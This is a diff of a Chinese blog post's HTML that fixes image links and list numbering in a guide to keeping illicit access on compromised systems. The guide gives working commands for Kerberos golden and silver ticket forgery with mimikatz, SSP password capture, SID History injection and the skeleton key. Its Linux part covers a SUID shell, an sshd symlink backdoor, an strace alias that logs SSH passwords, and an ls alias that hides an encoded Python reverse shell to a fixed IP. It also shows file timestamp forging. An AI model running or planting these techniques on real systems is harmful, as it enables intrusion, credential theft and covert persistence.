@@ -326,6 +354,7 @@ Web Folders.&#123;BDEADF00-C265-11d0-BCED-00A0C90AB50F&#125;
 DocFind Command.&#123;B005E690-678D-11d1-B758-00A0C90564FE&#125;
 脱机文件夹.&#123;AFDB1F70-2A4C-11d2-9039-00C04F8EEB3E&#125;
 打印机.&#123;2227A280-3AEA-1069-A2DE-08002B30309D&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>说明：其他手法还有畸形文件夹、保留文件名无法删除和利用 Easy File Locker 实现驱动级文件隐藏等等，或者直接起一个看起来名称很像的文件，比如 Index.php 和 lndex.php，这里其中一个是大写的 i，一个是小写的 L</p>
 <h1 id="域后门"><a href="#域后门" class="headerlink" title="域后门"></a>域后门</h1><h2 id="1、黄金票据"><a href="#1、黄金票据" class="headerlink" title="1、黄金票据"></a>1、黄金票据</h2><p>说明：通过黄金票据可以实现域内任意用户的伪造，因此即使目标域管理员的密码被修改了，通过黄金票据还是能够获取到对方的权限</p>
 <p>在生成黄金票据前，需要先获取以下信息：</p>
@@ -343,26 +372,29 @@ DocFind Command.&#123;B005E690-678D-11d1-B758-00A0C90564FE&#125;
 <li>使用 mimikatz 在域控上获取 krbtgt 用户的 NTLM HASH</li>
 </ol>
 <pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995893-285294-image.png" alt="img"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995893-285294-image.png" alt="img"></p>
 <p>从图中可以看到 krbtgt 的 NTLM Hash 为 d685b9c4fa2d318a9943ed68948af087，SID 为 S-1-5-21-284927032-1122706408-2778656994。此时已知域名为 teamssix.com，那么这时所需要的信息就全了。接着来到一台普通域用户权限的主机下，查看 \dc\c$ 发现时拒绝访问的</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029234249010.png" alt="image-20231029234249010"></p>
-<ol>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029234249010.png" alt="image-20231029234249010"></p>
+<ol start="2">
 <li>制作黄金票据</li>
 </ol>
 <pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:Administrator &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;krbtgt:d685b9c4fa2d318a9943ed68948af087 &#x2F;ticket:Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995946-803021-image.png" alt="img"></p>
-<ol>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995946-803021-image.png" alt="img"></p>
+<ol start="3">
 <li>使用 mimikatz 进行票据传递</li>
 </ol>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kerberos::ptt Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029234312908.png" alt="image-20231029234312908"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029234312908.png" alt="image-20231029234312908"></p>
 <p>再次查看 \dc\c$ 发现时就有权限了</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995960-720803-image.png" alt="img"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995960-720803-image.png" alt="img"></p>
 <p>PsExec 也同样可以</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029161651010.png" alt="image-20231029161651010"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995968-949523-image.png" alt="img"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029162219603.png" alt="image-20231029162219603"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029162836729.png" alt="image-20231029162836729"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029161651010.png" alt="image-20231029161651010"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995968-949523-image.png" alt="img"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029162219603.png" alt="image-20231029162219603"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029162836729.png" alt="image-20231029162836729"></p>
 <h2 id="2、白银票据"><a href="#2、白银票据" class="headerlink" title="2、白银票据"></a>2、白银票据</h2><p>白银票据和黄金票据的区别如下：</p>
 <ol>
 <li>白银票据不经过 KDC，因此白银票据日志相对于黄金票据会更少，同时白银票据的日志都在目标服务器上，域控上不会有日志，因此白银票据更加隐蔽。</li>
@@ -382,25 +414,28 @@ DocFind Command.&#123;B005E690-678D-11d1-B758-00A0C90564FE&#125;
 <li>CIFS 服务常用于 Windows 主机之间的文件共享，首先使用 mimikatz 获取服务账户的 NTLM 哈希，这里使用的 Username 为 DC$ 的 NTLM 哈希</li>
 </ol>
 <pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029164442629.png" alt="image-20231029164442629"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029164442629.png" alt="image-20231029164442629"></p>
 <p>补充：用户名末尾的$符</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029170542160.png" alt="image-20231029170542160"></p>
-<ol>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029170542160.png" alt="image-20231029170542160"></p>
+<ol start="2">
 <li>利用获取到的 Hash 生成白银票据</li>
 </ol>
 <pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:cifs &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995979-523341-image.png" alt="img"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029171030803.png" alt="image-20231029171030803"></p>
-<ol>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995979-523341-image.png" alt="img"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029171030803.png" alt="image-20231029171030803"></p>
+<ol start="3">
 <li>伪造票据后，使用 dir 命令就能获取到目标的 CIFS 服务权限了，除了 CIFS 服务外，还可以伪造 LDAP 等等服务</li>
 </ol>
 <h2 id="3、SSP权限维持"><a href="#3、SSP权限维持" class="headerlink" title="3、SSP权限维持"></a>3、SSP权限维持</h2><p>说明：通过 SSP 权限维持，用户在登录时，密码将会以明文的形式保存在 C:\Windows\System32\mimilsa.log 下。使用 mimikatz 将伪造的 SSP 注入内存，但如果域控重启，被注入内存的伪造 SSP 就会丢失。</p>
 <pre class="line-numbers language-none"><code class="language-none">#在Mimikatz中执行
 privilege::debug
 misc::memssp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105213575.png" alt="image-20231030105213575"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105213575.png" alt="image-20231030105213575"></p>
 <p>注销当前用户，输入用户名密码后重新登录，就可以获取到明文密码了</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996014-193247-image.png" alt="img"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996014-193247-image.png" alt="img"></p>
 <p>也可以使用 mimikatz 中的 mimilib.dll 文件进行 SSP 权限维持，这种方法重启后不会失效。</p>
 <h2 id="4、SID-History后门"><a href="#4、SID-History后门" class="headerlink" title="4、SID History后门"></a>4、SID History后门</h2><p>说明：每个用户都有自己的安全标识符即 SID，SID History的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源。</p>
 <p>操作手法：</p>
@@ -410,52 +445,65 @@ misc::memssp<span aria-hidden="true" class="line-numbers-rows"><span></span><spa
 <pre class="line-numbers language-none"><code class="language-none">privilege::debug
 sid::patch
 sid::add &#x2F;sam:test &#x2F;new:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996022-70539-image.png" alt="img"></p>
-<ol>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996022-70539-image.png" alt="img"></p>
+<ol start="2">
 <li>使用 test 用户登录，可以看到已经拥有了管理员权限</li>
 </ol>
-<p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-24/1642996033-818900-image.png" alt="img" style="zoom:200%;"></p>
+<img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-24/1642996033-818900-image.png" alt="img" style="zoom:200%;">
+
+
+
 <h2 id="5、万能密码"><a href="#5、万能密码" class="headerlink" title="5、万能密码"></a>5、万能密码</h2><p>说明：在域管权限下，使用 mimikatz 即可</p>
 <pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;privilege::debug&quot; &quot;misc::skeleton&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996044-182676-image.png" alt="img"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996044-182676-image.png" alt="img"></p>
 <p>此时，就可以在域内以任意用户的身份利用 mimikatz 密码进行登录了</p>
 <pre class="line-numbers language-none"><code class="language-none">net use \\dc\ipc$ &quot;mimikatz&quot; &#x2F;user:teamssix\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029173359750.png" alt="image-20231029173359750"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029173359750.png" alt="image-20231029173359750"></p>
 <p>IPC$共享是Windows系统中的一个特殊隐藏共享，用于进程间通信。通过建立与IPC$共享的连接，可以与远程计算机进行某些操作，例如执行命令、访问共享文件夹等。</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996053-90546-image.png" alt="img"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996053-90546-image.png" alt="img"></p>
 <p>除了上面的方法外，还可以使用 DSRM 账号进行权限维持，也可以使用 Hook PasswordChangeNotify 脚本查看目标用户修改后的新密码。</p>
 <h1 id="Linux主机后门"><a href="#Linux主机后门" class="headerlink" title="Linux主机后门"></a>Linux主机后门</h1><h2 id="1、添加用户"><a href="#1、添加用户" class="headerlink" title="1、添加用户"></a>1、添加用户</h2><pre class="line-numbers language-none"><code class="language-none">#一句话添加用户（test:123456）
 useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test
 #或者使用openssl
 useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <h2 id="2、SUID-Shell"><a href="#2、SUID-Shell" class="headerlink" title="2、SUID Shell"></a>2、SUID Shell</h2><p>说明：SUID Shell是一种可用于以拥有者权限运行的shell</p>
 <pre class="line-numbers language-none"><code class="language-none">#以root用户权限执行下面的命令
 cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;shell
 chmod u+s &#x2F;tmp&#x2F;shell
 #在使用普通用户权限的时候，执行以下命令就能获取root权限
 &#x2F;tmp&#x2F;shell -p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996062-570634-image.png" alt="img"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996062-570634-image.png" alt="img"></p>
 <h2 id="3、软链接"><a href="#3、软链接" class="headerlink" title="3、软链接"></a>3、软链接</h2><p>说明：软链接的利用前提是 ssh 配置中开启了 PAM 进行身份验证</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029193747195.png" alt="image-20231029193747195"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029193747195.png" alt="image-20231029193747195"></p>
 <pre class="line-numbers language-none"><code class="language-none">#使用以下命令查看是否配置PAM认证
 cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config | grep UsePAM
 #在目标主机上创建一句话后门
 ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;8888
 #然后直接ssh root@IP -p 8888，输入任意密码，就可以登录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105239917.png" alt="image-20231030105239917"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105239917.png" alt="image-20231030105239917"></p>
 <h2 id="4、strace后门-或称alias-后门"><a href="#4、strace后门-或称alias-后门" class="headerlink" title="4、strace后门(或称alias 后门)"></a>4、strace后门(或称alias 后门)</h2><p>alias命令介绍：</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029200325656.png" alt="image-20231029200325656"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029200428340.png" alt="image-20231029200428340"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105401109.png" alt="image-20231030105401109"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029200325656.png" alt="image-20231029200325656"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029200428340.png" alt="image-20231029200428340"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105401109.png" alt="image-20231030105401109"></p>
 <p>strace命令介绍：</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029195323749.png" alt="image-20231029195323749"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029195352272.png" alt="image-20231029195352272"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029195323749.png" alt="image-20231029195323749"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029195352272.png" alt="image-20231029195352272"></p>
 <p>利用方式：</p>
 <pre class="line-numbers language-none"><code class="language-none">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>这时当用户使用 ssh 连接其他主机时，在 /tmp/.ssh.log 下就能看到连接的密码、操作了，只是显示的不是很直观，如下</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105433940.png" alt="image-20231030105433940"></p>
+
+<p>这时当用户使用 ssh 连接其他主机时，在 &#x2F;tmp&#x2F;.ssh.log 下就能看到连接的密码、操作了，只是显示的不是很直观，如下</p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105433940.png" alt="image-20231030105433940"></p>
 <p>另一种利用方式</p>
 <pre class="line-numbers language-none"><code class="language-none">alias ls&#x3D;&#39;alerts()&#123; ls $* --color&#x3D;auto;python3 -c &quot;import base64,sys;exec(base64.b64decode(&#123;2:str,3:lambda b:bytes(b,&#39;\&#39;&#39;UTF-8&#39;\&#39;&#39;)&#125;[sys.version_info[0]](&#39;\&#39;&#39;aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTkyLjE2OC4yNDEuMTI4IiwgNjY2NikpCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAwKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMSkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDIpCiAgICAgICAgcCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCAiLWkiXSkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBleGl0KCk&#x3D;&#39;\&#39;&#39;)))&quot;;&#125;;alerts&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>上面的 base64 解码后为以下内容</p>
 <pre class="line-numbers language-none"><code class="language-none">import os,socket,subprocess;
 ret &#x3D; os.fork()
@@ -471,11 +519,12 @@ else:
         p &#x3D; subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-i&quot;])
     except Exception as e:
         exit()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>这样当用户使用 ls 命令时，就会反弹 shell 回来了，当然除了反弹 shell 还可以做很多的其他操作</p>
 <h2 id="5、使用screen命令后台运行"><a href="#5、使用screen命令后台运行" class="headerlink" title="5、使用screen命令后台运行"></a>5、使用screen命令后台运行</h2><p>说明：利用screen命令让命令在后台运行实现权限维持</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029211243551.png" alt="image-20231029211243551"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029211419320.png" alt="image-20231029211419320"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029211428846.png" alt="image-20231029211428846"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029211243551.png" alt="image-20231029211243551"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029211419320.png" alt="image-20231029211419320"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029211428846.png" alt="image-20231029211428846"></p>
 <pre class="line-numbers language-none"><code class="language-none">#发现screen
 #查看进程寻找
 ps -aux | grep screen
@@ -485,18 +534,23 @@ ps -aux | grep screen
 screen -S screenname
 #Ctrl+a+d(Mac 是 control+a+d)退出 screen 并使命令在后台运行
 #screen -r screenname 进入刚才的终端<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <blockquote>
 <p>除此之外，还有比较常见的定时任务、SSH 公钥登录以及 SSH warpper、openssh 后门、PAM 后门、rootkit 后门等等</p>
 </blockquote>
 <h1 id="Linux文件隐藏"><a href="#Linux文件隐藏" class="headerlink" title="Linux文件隐藏"></a>Linux文件隐藏</h1><h2 id="1、隐藏文件时间戳"><a href="#1、隐藏文件时间戳" class="headerlink" title="1、隐藏文件时间戳"></a>1、隐藏文件时间戳</h2><pre class="line-numbers language-none"><code class="language-none">#复制其他文件的时间
 touch -r teamssix.txt evil.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029195215049.png" alt="image-20231029195215049"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029195215049.png" alt="image-20231029195215049"></p>
 <pre class="line-numbers language-none"><code class="language-none">#自定义文件的时间，这里演示将时间改为 2022 年的 1 月 1 日 1 时 1 分 1 秒
 touch -t 202201010101.01 evil.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105452885.png" alt="image-20231030105452885"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105452885.png" alt="image-20231030105452885"></p>
 <h2 id="2、隐身登录"><a href="#2、隐身登录" class="headerlink" title="2、隐身登录"></a>2、隐身登录</h2><p>说明：隐身登录系统，不会被 w、who、last 检测到</p>
 <p>w命令介绍：</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029204745282.png" alt="image-20231029204745282"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029204745282.png" alt="image-20231029204745282"></p>
 <pre class="line-numbers language-none"><code class="language-none">#显示当前登录用户的信息
 w
 #显示短格式的用户信息
@@ -505,9 +559,10 @@ w -s
 w -u
 #显示用户的登录IP地址
 w -i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
